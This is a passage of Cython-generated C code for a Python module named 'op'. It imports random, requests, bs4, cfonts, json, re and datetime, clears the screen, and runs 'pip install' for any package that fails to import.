__Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_3 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_random, __pyx_t_2, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_randrange); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_rr, __pyx_t_2) < (0)) __PYX_ERR(0, 5, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_3 = __Pyx_PyList_Pack(1, __pyx_mstate_global->__pyx_n_u_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __pyx_t_2 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_random, __pyx_t_3, 0); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __pyx_t_3 = __Pyx_ImportFrom(__pyx_t_2, __pyx_mstate_global->__pyx_n_u_choice); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_cc, __pyx_t_3) < (0)) __PYX_ERR(0, 6, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n  \n  __pyx_t_2 = __Pyx_PyList_Pack(1, __pyx_mstate_global->__pyx_n_u_post); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  __pyx_t_3 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_requests, __pyx_t_2, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 7, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __pyx_t_2 = __Pyx_ImportFrom(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_post); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 7, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_2);\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_pp, __pyx_t_2) < (0)) __PYX_ERR(0, 7, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_sys, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 8, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_sys, __pyx_t_3) < (0)) __PYX_ERR(0, 8, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_os, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 9, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_3);\n  if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_os, __pyx_t_3) < (0)) __PYX_ERR(0, 9, __pyx_L1_error)\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  __pyx_t_2 = NULL;\n  __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 10, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_4);\n  __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_4, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 10, __pyx_L1_error)\n  __Pyx_GOTREF(__pyx_t_5);\n  __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n  __pyx_t_6 = 1;\n  {\n    PyObject *__pyx_callargs[2] = {__pyx_t_2, __pyx_mstate_global->__pyx_n_u_clear};\n    __pyx_t_3 = __Pyx_PyObject_FastCall(__pyx_t_5, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n    if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 10, __pyx_L1_error)\n    __Pyx_GOTREF(__pyx_t_3);\n  }\n  __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_7, &__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_8);\n     {\n\n      \n      __pyx_t_3 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_cfonts, NULL); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 12, __pyx_L2_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_cfonts, __pyx_t_3) < (0)) __PYX_ERR(0, 12, __pyx_L2_error)\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n      \n      __pyx_t_3 = __Pyx_PyList_Pack(1, __pyx_mstate_global->__pyx_n_u_render); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 13, __pyx_L2_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_cfonts, __pyx_t_3, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 13, __pyx_L2_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_3 = __Pyx_ImportFrom(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_render); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 13, __pyx_L2_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_render, __pyx_t_3) < (0)) __PYX_ERR(0, 13, __pyx_L2_error)\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    goto __pyx_L7_try_end;\n    __pyx_L2_error:;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_3, &__pyx_t_2) < 0) __PYX_ERR(0, 14, __pyx_L4_except_error)\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_3);\n      __Pyx_XGOTREF(__pyx_t_2);\n\n      \n      __pyx_t_9 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 15, __pyx_L4_except_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 15, __pyx_L4_except_error)\n      __Pyx_GOTREF(__pyx_t_11);\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_9, __pyx_mstate_global->__pyx_kp_u_pip_install_python_cfonts};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_11, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 15, __pyx_L4_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      goto __pyx_L3_exception_handled;\n    }\n\n    \n    __pyx_L4_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    goto __pyx_L1_error;\n    __pyx_L3_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    __pyx_L7_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_1);\n     {\n\n      \n      __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_requests, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 17, __pyx_L10_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_requests, __pyx_t_2) < (0)) __PYX_ERR(0, 17, __pyx_L10_error)\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    goto __pyx_L15_try_end;\n    __pyx_L10_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_3, &__pyx_t_5) < 0) __PYX_ERR(0, 18, __pyx_L12_except_error)\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_3);\n      __Pyx_XGOTREF(__pyx_t_5);\n\n      \n      __pyx_t_11 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 19, __pyx_L12_except_error)\n      __Pyx_GOTREF(__pyx_t_9);\n      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 19, __pyx_L12_except_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_11, __pyx_mstate_global->__pyx_kp_u_pip_install_requests};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 19, __pyx_L12_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      goto __pyx_L11_exception_handled;\n    }\n\n    \n    __pyx_L12_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    goto __pyx_L1_error;\n    __pyx_L11_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    __pyx_L15_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_7, &__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_8);\n     {\n\n      \n      __pyx_t_5 = __Pyx_PyList_Pack(1, __pyx_mstate_global->__pyx_n_u_BeautifulSoup); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 21, __pyx_L18_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __pyx_t_3 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_bs4, __pyx_t_5, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 21, __pyx_L18_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __pyx_t_5 = __Pyx_ImportFrom(__pyx_t_3, __pyx_mstate_global->__pyx_n_u_BeautifulSoup); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 21, __pyx_L18_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_BeautifulSoup, __pyx_t_5) < (0)) __PYX_ERR(0, 21, __pyx_L18_error)\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    goto __pyx_L23_try_end;\n    __pyx_L18_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_3, &__pyx_t_5, &__pyx_t_2) < 0) __PYX_ERR(0, 22, __pyx_L20_except_error)\n      __Pyx_XGOTREF(__pyx_t_3);\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_2);\n\n      \n      __pyx_t_10 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_11, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 23, __pyx_L20_except_error)\n      __Pyx_GOTREF(__pyx_t_11);\n      __pyx_t_9 = __Pyx_PyObject_GetAttrStr(__pyx_t_11, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 23, __pyx_L20_except_error)\n      __Pyx_GOTREF(__pyx_t_9);\n      __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_10, __pyx_mstate_global->__pyx_kp_u_pip_install_bs4};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_9, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n        __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 23, __pyx_L20_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      goto __pyx_L19_exception_handled;\n    }\n\n    \n    __pyx_L20_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    goto __pyx_L1_error;\n    __pyx_L19_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_ExceptionReset(__pyx_t_1, __pyx_t_7, __pyx_t_8);\n    __pyx_L23_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_7, &__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_1);\n     {\n\n      \n      __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_json, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 25, __pyx_L26_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_json, __pyx_t_2) < (0)) __PYX_ERR(0, 25, __pyx_L26_error)\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n      \n      __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_re, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 26, __pyx_L26_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_re, __pyx_t_2) < (0)) __PYX_ERR(0, 26, __pyx_L26_error)\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n      \n      __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_os, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 27, __pyx_L26_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_os, __pyx_t_2) < (0)) __PYX_ERR(0, 27, __pyx_L26_error)\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n      \n      __pyx_t_2 = __Pyx_ImportDottedModule(__pyx_mstate_global->__pyx_n_u_sys, NULL); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 28, __pyx_L26_error)\n      __Pyx_GOTREF(__pyx_t_2);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_sys, __pyx_t_2) < (0)) __PYX_ERR(0, 28, __pyx_L26_error)\n      __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    goto __pyx_L31_try_end;\n    __pyx_L26_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_2, &__pyx_t_5, &__pyx_t_3) < 0) __PYX_ERR(0, 29, __pyx_L28_except_error)\n      __Pyx_XGOTREF(__pyx_t_2);\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_3);\n\n      \n      __pyx_t_9 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 30, __pyx_L28_except_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __pyx_t_11 = __Pyx_PyObject_GetAttrStr(__pyx_t_10, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_11)) __PYX_ERR(0, 30, __pyx_L28_except_error)\n      __Pyx_GOTREF(__pyx_t_11);\n      __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_9, __pyx_mstate_global->__pyx_kp_u_pip_install_json};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_11, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n        __Pyx_DECREF(__pyx_t_11); __pyx_t_11 = 0;\n        if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 30, __pyx_L28_except_error)\n        __Pyx_GOTREF(__pyx_t_4);\n      }\n      __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;\n      __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n      __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n      __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n      goto __pyx_L27_exception_handled;\n    }\n\n    \n    __pyx_L28_except_error:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    goto __pyx_L1_error;\n    __pyx_L27_exception_handled:;\n    __Pyx_XGIVEREF(__pyx_t_8);\n    __Pyx_XGIVEREF(__pyx_t_7);\n    __Pyx_XGIVEREF(__pyx_t_1);\n    __Pyx_ExceptionReset(__pyx_t_8, __pyx_t_7, __pyx_t_1);\n    __pyx_L31_try_end:;\n  }\n\n  \n  {\n    __Pyx_PyThreadState_declare\n    __Pyx_PyThreadState_assign\n    __Pyx_ExceptionSave(&__pyx_t_1, &__pyx_t_7, &__pyx_t_8);\n    __Pyx_XGOTREF(__pyx_t_1);\n    __Pyx_XGOTREF(__pyx_t_7);\n    __Pyx_XGOTREF(__pyx_t_8);\n     {\n\n      \n      __pyx_t_3 = __Pyx_PyList_Pack(1, __pyx_mstate_global->__pyx_n_u_datetime); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 32, __pyx_L34_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      __pyx_t_5 = __Pyx_Import(__pyx_mstate_global->__pyx_n_u_datetime, __pyx_t_3, 0); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 32, __pyx_L34_error)\n      __Pyx_GOTREF(__pyx_t_5);\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __pyx_t_3 = __Pyx_ImportFrom(__pyx_t_5, __pyx_mstate_global->__pyx_n_u_datetime); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 32, __pyx_L34_error)\n      __Pyx_GOTREF(__pyx_t_3);\n      if (PyDict_SetItem(__pyx_mstate_global->__pyx_d, __pyx_mstate_global->__pyx_n_u_datetime, __pyx_t_3) < (0)) __PYX_ERR(0, 32, __pyx_L34_error)\n      __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;\n      __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;\n\n      \n    }\n    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;\n    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;\n    __Pyx_XDECREF(__pyx_t_8); __pyx_t_8 = 0;\n    goto __pyx_L39_try_end;\n    __pyx_L34_error:;\n    __Pyx_XDECREF(__pyx_t_10); __pyx_t_10 = 0;\n    __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;\n    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;\n    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;\n    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;\n    __Pyx_XDECREF(__pyx_t_9); __pyx_t_9 = 0;\n\n    \n     {\n      __Pyx_AddTraceback("op", __pyx_clineno, __pyx_lineno, __pyx_filename);\n      if (__Pyx_GetException(&__pyx_t_5, &__pyx_t_3, &__pyx_t_2) < 0) __PYX_ERR(0, 33, __pyx_L36_except_error)\n      __Pyx_XGOTREF(__pyx_t_5);\n      __Pyx_XGOTREF(__pyx_t_3);\n      __Pyx_XGOTREF(__pyx_t_2);\n\n      \n      __pyx_t_11 = NULL;\n      __Pyx_GetModuleGlobalName(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_os); if (unlikely(!__pyx_t_9)) __PYX_ERR(0, 34, __pyx_L36_except_error)\n      __Pyx_GOTREF(__pyx_t_9);\n      __pyx_t_10 = __Pyx_PyObject_GetAttrStr(__pyx_t_9, __pyx_mstate_global->__pyx_n_u_system); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 34, __pyx_L36_except_error)\n      __Pyx_GOTREF(__pyx_t_10);\n      __Pyx_DECREF(__pyx_t_9); __pyx_t_9 = 0;\n      __pyx_t_6 = 1;\n      {\n        PyObject *__pyx_callargs[2] = {__pyx_t_11, __pyx_mstate_global->__pyx_kp_u_pip_install_re};\n        __pyx_t_4 = __Pyx_PyObject_FastCall(__pyx_t_10, __pyx_callargs+__pyx_t_6, (2-__pyx_t_6) | (__pyx_t_6*__Pyx_PY_VECTORCALL_ARGUMENTS_OFFSET));\n        __Pyx_XDECREF(__pyx_t_11); __pyx_t_11 = 0;\n        __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;\n        if 